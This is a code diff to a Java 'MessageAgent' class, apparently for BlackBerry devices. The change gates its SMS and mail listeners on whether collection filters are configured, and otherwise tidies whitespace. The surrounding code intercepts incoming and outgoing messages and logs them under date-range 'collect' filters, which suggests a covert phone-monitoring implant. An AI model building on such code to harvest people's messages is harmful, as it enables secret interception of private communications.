@@ -75,6 +75,9 @@ public final class MessageAgent extends Agent implements SmsObserver {
     protected static final int SLEEPTIME = 5000;
     protected static final int PERIODTIME = 60 * 60 * 1000;
 
+    boolean mailEnabled;
+    boolean smsEnabled;
+
     MailListener mailListener;
     SmsListener smsListener;
 
@@ -153,11 +156,14 @@ public final class MessageAgent extends Agent implements SmsObserver {
             debug.info("First Run");
             //#endif
             firstRun = false;
-            smsListener.run();
-            mailListener.run();
+            //smsListener.run();
+            // TODO: solo se mail e' enabled
+            if (mailEnabled) {
+                mailListener.run();
+            }
         }
 
-        if (haveNewAccount()) {
+        if (mailEnabled && haveNewAccount()) {
             //#ifdef DEBUG
             debug.info("Restarting MessageAgent, new account");
             //#endif
@@ -178,8 +184,13 @@ public final class MessageAgent extends Agent implements SmsObserver {
     public void actualStart() {
         firstRun = true;
         //TODO: se gli sms sono disabilitati non far partire il listener.
-        smsListener.addSmsObserver(this);
-        mailListener.start();
+        if (smsEnabled) {
+            smsListener.addSmsObserver(this);
+        }
+
+        if (mailEnabled) {
+            mailListener.start();
+        }
     }
 
     /*
@@ -187,8 +198,13 @@ public final class MessageAgent extends Agent implements SmsObserver {
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
     public void actualStop() {
-        smsListener.removeSmsObserver(this);
-        mailListener.stop();
+        if (smsEnabled) {
+            smsListener.removeSmsObserver(this);
+        }
+
+        if (mailEnabled) {
+            mailListener.stop();
+        }
     }
 
     /**
@@ -264,6 +280,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
                             debug.info(filter.toString());
                             //#endif
 
+                            mailEnabled = true;
                             if (filter.type == Filter.TYPE_COLLECT) {
                                 //#ifdef DEBUG
                                 debug.trace("Filter.TYPE_COLLECT!");
@@ -290,7 +307,6 @@ public final class MessageAgent extends Agent implements SmsObserver {
                                     lastcheckSet("FilterFROM", filter.fromDate);
                                     lastcheckSet("FilterTO", filter.toDate);
                                 }
-
                             }
 
                             //#ifdef DEBUG
@@ -309,6 +325,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
                             //#ifdef DEBUG                            
                             debug.info(filter.toString());
                             //#endif
+                            smsEnabled = true;
                             filtersSMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_UNKNOWN: // fall through
@@ -403,10 +420,8 @@ public final class MessageAgent extends Agent implements SmsObserver {
 
         //lastcheck = new Date(0); 
     }
-    
 
-    public void onNewSms(
-            final javax.wireless.messaging.Message message,
+    public void onNewSms(final javax.wireless.messaging.Message message,
             final boolean incoming) {
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message");
@@ -572,7 +587,5 @@ public final class MessageAgent extends Agent implements SmsObserver {
 
         return number;
     }
-
-
 
 }
